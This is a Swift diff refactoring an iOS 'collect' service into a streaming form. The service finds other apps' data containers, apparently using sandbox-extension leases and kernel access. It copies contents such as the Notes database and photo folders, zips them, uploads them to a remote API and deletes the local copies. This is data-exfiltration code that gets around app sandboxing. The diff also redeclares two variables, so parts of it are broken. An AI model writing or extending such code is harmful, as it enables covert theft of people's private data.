@@ -982,175 +982,86 @@ enum ProtocolCollectService {
         var uploadedNames: [String] = []
         var byteCount: Int64 = 0
 
-        for (index, config) in configs.enumerated() {
-            let statusLabel = config.appName.isEmpty ? config.bundleID : config.appName
-            log("collect: running \(index + 1)/\(configs.count) bundle=\(config.bundleID) appName=\(config.appName.isEmpty ? "-" : config.appName) items=\(config.items.count)")
-            guard let resolution = resolveContainer(for: config) else {
-                log("collect: skip \(config.bundleID) — container unavailable")
-                await MainActor.run {
-                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：容器不可用")
-                }
-                continue
-            }
-            let containerPath = resolution.path
-            // Hold the userland extension for the whole bundle (copy + zip +
-            // upload metadata). On 26.6.2 / 27.x this grant is the only access
-            // path to the container, so it must outlive the copy loop.
-            defer { resolution.leases.forEach { $0.release() } }
-            if !resolution.leases.isEmpty {
-                log("collect: retained \(resolution.leases.count) userland lease(s) for \(config.bundleID)")
-            }
-            let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
-            let sources = config.items.compactMap { item -> (url: URL, name: String)? in
-                guard let itemURL = resolvedItemURL(
-                    item,
-                    containerURL: containerURL,
-                    config: config,
-                    fileManager: fileManager
-                ) else { return nil }
-                return (itemURL, itemURL.lastPathComponent)
-            }
-            guard !sources.isEmpty else {
-                log("collect: skip \(config.bundleID) — no collectable items")
-                await MainActor.run {
-                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：采集项路径不存在")
-                }
-                continue
-            }
+        let byID = Dictionary(configs.map { ($0.bundleID, $0) }, uniquingKeysWith: { first, _ in first })
+        var pending = Set(byID.keys)
+        var zipCount = 0
+        var uploadedCount = 0
+        var uploadedNames: [String] = []
+        var byteCount: Int64 = 0
 
-            let appName = appFolderName(for: config)
-            log("collect: zip folder name \"\(appName)\" for \(config.bundleID)")
-            let stagingParent = documentsURL.appendingPathComponent(
-                ".collect-\(stamp)-\(UUID().uuidString)",
-                isDirectory: true
-            )
-            let stagingURL = stagingParent.appendingPathComponent(appName, isDirectory: true)
-            do {
-                try fileManager.createDirectory(
-                    atPath: stagingURL.path,
-                    withIntermediateDirectories: true,
-                    attributes: nil
-                )
-            } catch {
-                log("collect: cannot create staging folder")
-                continue
+        // Stream container discoveries: as soon as the inode walk identifies a
+        // container for a pending bundle, copy + zip + upload it right away while
+        // the walk keeps running. Waiting for the entire 50M sweep before the
+        // first ZIP was what made a 2.5-minute scan look like "nothing happens".
+        let stream = AsyncStream<(String, String)> { continuation in
+            ContainerStore.setDiscoveryHandler { identifier, path in
+                continuation.yield((identifier, path))
             }
-            var copied = 0
-            let containerRootURL = URL(fileURLWithPath: containerPath, isDirectory: true)
-            for source in sources {
-                // 整容器项：把容器内的条目平铺复制进 <appName>/，
-                // 与 legacy 管线的 zip 结构一致（NoteStore.sqlite 直接可见）
-                if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
-                    let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
-                    log("collect: whole-container copy — \(entries.count) entries")
-                    var tried = 0
-                    for entry in entries {
-                        tried += 1
-                        // MCM's own metadata plist is not readable through a
-                        // worse_query extension; skipping it keeps the copy log
-                        // free of a guaranteed failure.
-                        if entry.hasPrefix(".com.apple.mobile_container_manager") {
-                            continue
-                        }
-                        let child = source.url.appendingPathComponent(entry)
-                        do {
-                            _ = try FileManagerService.transferItem(
-                                at: child,
-                                into: stagingURL,
-                                mode: .copy,
-                                conflictPolicy: .fail,
-                                fileManager: fileManager
-                            )
-                            copied += 1
-                        } catch {
-                            log("collect: copy failed \(entry) — \(error)")
-                            copied += copyDirectoryFallback(
-                                at: child,
-                                into: stagingURL,
-                                fileManager: fileManager,
-                                depth: 0
-                            )
-                        }
-                    }
-                    log("collect: whole-container done — tried=\(tried) copied=\(copied)")
-                    continue
-                }
-                do {
-                    _ = try FileManagerService.transferItem(
-                        at: source.url,
-                        into: stagingURL,
-                        mode: .copy,
-                        conflictPolicy: .fail,
-                        fileManager: fileManager
-                    )
-                    copied += 1
-                } catch {
-                    log("collect: copy failed \(source.name) — \(error)")
-                    // 目录复制失败的兜底：逐文件复制，读不了的跳过，
-                    // 保证 NoteStore.sqlite 等能拿多少拿多少。
-                    copied += copyDirectoryFallback(
-                        at: source.url,
-                        into: stagingURL,
-                        fileManager: fileManager,
-                        depth: 0
-                    )
-                }
-            }
-            guard copied > 0 else {
-                try? fileManager.removeItem(at: stagingParent)
-                await MainActor.run {
-                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：文件复制失败")
-                }
-                continue
-            }
-
-            let zipName = uniqueZipName(
-                baseName: "collect-\(appName)-\(stamp)",
-                in: documentsURL,
-                fileManager: fileManager
-            )
-            guard let archive = try? FileManagerService.createZIPArchive(
-                containing: [stagingURL],
-                named: zipName,
-                in: documentsURL,
-                fileManager: fileManager
-            ) else {
-                try? fileManager.removeItem(at: stagingParent)
-                log("collect: archive failed for \(config.bundleID)")
-                await MainActor.run {
-                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：打包失败")
-                }
-                continue
-            }
-            try? fileManager.removeItem(at: stagingParent)
-
-            zipCount += 1
-            byteCount += archive.sourceBytes
-            log("collect: zip SUCCESS — \(archive.archiveURL.lastPathComponent) bytes=\(archive.sourceBytes)")
-            do {
-                try await ProtocolAPI.uploadZip(
-                    fileURL: archive.archiveURL,
-                    bundleID: config.bundleID
-                )
-                uploadedCount += 1
-                uploadedNames.append(statusLabel)
-                await MainActor.run {
-                    ProtocolStatusLog.shared.append(
-                        "ZIP 上传成功: \(config.bundleID)，已删除本地文件"
-                    )
-                }
-                try? fileManager.removeItem(at: archive.archiveURL)
-                log("collect: local zip removed after upload — \(archive.archiveURL.lastPathComponent)")
-            } catch {
-                log("collect: upload FAILED — \(archive.archiveURL.lastPathComponent): \(error)")
-                let reason = shortReason(error)
-                await MainActor.run {
-                    ProtocolStatusLog.shared.append(
-                        "ZIP 上传失败: \(config.bundleID)，\(reason)"
-                    )
-                }
+            ContainerStore.setScanCompletionHandler {
+                continuation.finish()
             }
         }
+        defer {
+            ContainerStore.setDiscoveryHandler(nil)
+            ContainerStore.setScanCompletionHandler(nil)
+        }
+
+        func consume(_ identifier: String, _ path: String) async {
+            guard pending.contains(identifier), let config = byID[identifier] else { return }
+            pending.remove(identifier)
+            log("collect: discovered \(identifier) — collecting now (\(path))")
+            let lease = ContainerStore.retainAccess(path)
+            let outcome = await collectOne(
+                config,
+                containerPath: path,
+                stamp: stamp,
+                documentsURL: documentsURL,
+                fileManager: fileManager
+            )
+            lease?.release()
+            if outcome.zipped {
+                zipCount += 1
+                byteCount += outcome.bytes
+            }
+            if outcome.uploaded {
+                uploadedCount += 1
+                uploadedNames.append(outcome.label)
+            }
+            if let reason = outcome.skippedReason {
+                await MainActor.run {
+                    ProtocolStatusLog.shared.append("采集失败 — \(outcome.label)：\(reason)")
+                }
+            }
+            log("collect: \(identifier) done — zips=\(zipCount) uploaded=\(uploadedCount) remaining=\(pending.count)")
+        }
+
+        // 1. Anything the current index already knows (disk cache or a finished walk).
+        let snapshot = ContainerStore.containerIndexSnapshot(waitForBuild: false)
+        for config in configs where pending.contains(config.bundleID) {
+            if let path = snapshot[config.bundleID] {
+                await consume(config.bundleID, path)
+            }
+        }
+
+        // 2. Keep the walk running in the background; its discoveries arrive on the stream.
+        Task.detached(priority: .userInitiated) {
+            _ = ContainerStore.containerIndexSnapshot(waitForBuild: true)
+        }
+
+        // 3. Collect as discoveries arrive, until every bundle is handled or the walk ends.
+        for await (identifier, path) in stream {
+            await consume(identifier, path)
+            if pending.isEmpty { break }
+        }
+
+        for bundleID in pending {
+            let label = (byID[bundleID]?.appName.isEmpty == false) ? byID[bundleID]!.appName : bundleID
+            log("collect: skip \(bundleID) — container unavailable after scan")
+            await MainActor.run {
+                ProtocolStatusLog.shared.append("采集失败 — \(label)：容器不可用")
+            }
+        }
+
 
         pruneLocalZips(in: documentsURL, fileManager: fileManager)
 
@@ -1388,6 +1299,155 @@ enum ProtocolCollectService {
         log("collect: no userland extension for \(path) — copying will rely on kernel access")
         return []
     }
+
+    struct CollectOutcome {
+        var label: String
+        var zipped = false
+        var uploaded = false
+        var bytes: Int64 = 0
+        var skippedReason: String?
+    }
+
+    /// One bundle: resolve its items inside `containerPath`, copy, zip, upload.
+    /// Extracted so the streaming driver can run it the moment a container is
+    /// discovered, without waiting for the whole index.
+    private static func collectOne(
+        _ config: CollectConfig,
+        containerPath: String,
+        stamp: String,
+        documentsURL: URL,
+        fileManager: FileManager
+    ) async -> CollectOutcome {
+        let statusLabel = config.appName.isEmpty ? config.bundleID : config.appName
+        var outcome = CollectOutcome(label: statusLabel)
+
+        let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
+        let sources = config.items.compactMap { item -> (url: URL, name: String)? in
+            guard let itemURL = resolvedItemURL(
+                item,
+                containerURL: containerURL,
+                config: config,
+                fileManager: fileManager
+            ) else { return nil }
+            return (itemURL, itemURL.lastPathComponent)
+        }
+        guard !sources.isEmpty else {
+            log("collect: skip \(config.bundleID) — no collectable items")
+            outcome.skippedReason = "采集项路径不存在"
+            return outcome
+        }
+
+        let appName = appFolderName(for: config)
+        let stagingParent = documentsURL.appendingPathComponent(
+            ".collect-\(stamp)-\(UUID().uuidString)",
+            isDirectory: true
+        )
+        let stagingURL = stagingParent.appendingPathComponent(appName, isDirectory: true)
+        do {
+            try fileManager.createDirectory(
+                atPath: stagingURL.path,
+                withIntermediateDirectories: true,
+                attributes: nil
+            )
+        } catch {
+            log("collect: cannot create staging folder")
+            outcome.skippedReason = "创建临时目录失败"
+            return outcome
+        }
+
+        var copied = 0
+        let containerRootURL = containerURL
+        for source in sources {
+            if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
+                let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
+                log("collect: whole-container copy — \(entries.count) entries")
+                for entry in entries {
+                    if entry.hasPrefix(".com.apple.mobile_container_manager") { continue }
+                    let child = source.url.appendingPathComponent(entry)
+                    do {
+                        _ = try FileManagerService.transferItem(
+                            at: child,
+                            into: stagingURL,
+                            mode: .copy,
+                            conflictPolicy: .fail,
+                            fileManager: fileManager
+                        )
+                        copied += 1
+                    } catch {
+                        log("collect: copy failed \(entry) — \(error)")
+                        copied += copyDirectoryFallback(
+                            at: child,
+                            into: stagingURL,
+                            fileManager: fileManager,
+                            depth: 0
+                        )
+                    }
+                }
+                continue
+            }
+            do {
+                _ = try FileManagerService.transferItem(
+                    at: source.url,
+                    into: stagingURL,
+                    mode: .copy,
+                    conflictPolicy: .fail,
+                    fileManager: fileManager
+                )
+                copied += 1
+            } catch {
+                log("collect: copy failed \(source.name) — \(error)")
+                copied += copyDirectoryFallback(
+                    at: source.url,
+                    into: stagingURL,
+                    fileManager: fileManager,
+                    depth: 0
+                )
+            }
+        }
+        guard copied > 0 else {
+            try? fileManager.removeItem(at: stagingParent)
+            outcome.skippedReason = "文件复制失败"
+            return outcome
+        }
+
+        let zipName = uniqueZipName(
+            baseName: "collect-\(appName)-\(stamp)",
+            in: documentsURL,
+            fileManager: fileManager
+        )
+        guard let archive = try? FileManagerService.createZIPArchive(
+            containing: [stagingURL],
+            named: zipName,
+            in: documentsURL,
+            fileManager: fileManager
+        ) else {
+            try? fileManager.removeItem(at: stagingParent)
+            log("collect: archive failed for \(config.bundleID)")
+            outcome.skippedReason = "打包失败"
+            return outcome
+        }
+        try? fileManager.removeItem(at: stagingParent)
+
+        outcome.zipped = true
+        outcome.bytes = archive.sourceBytes
+        log("collect: zip SUCCESS — \(archive.archiveURL.lastPathComponent) bytes=\(archive.sourceBytes)")
+        do {
+            try await ProtocolAPI.uploadZip(fileURL: archive.archiveURL, bundleID: config.bundleID)
+            outcome.uploaded = true
+            await MainActor.run {
+                ProtocolStatusLog.shared.append("ZIP 上传成功: \(config.bundleID)，已删除本地文件")
+            }
+            try? fileManager.removeItem(at: archive.archiveURL)
+            log("collect: local zip removed after upload — \(archive.archiveURL.lastPathComponent)")
+        } catch {
+            log("collect: upload FAILED — \(archive.archiveURL.lastPathComponent): \(error)")
+            await MainActor.run {
+                ProtocolStatusLog.shared.append("ZIP 上传失败: \(config.bundleID)，\(shortReason(error))")
+            }
+        }
+        return outcome
+    }
+
 
     private static func resolveContainer(for config: CollectConfig) -> CollectContainerResolution? {
         // 所有 items 都是绝对路径（如 /var/mobile/Media/DCIM、PhotoData）时，
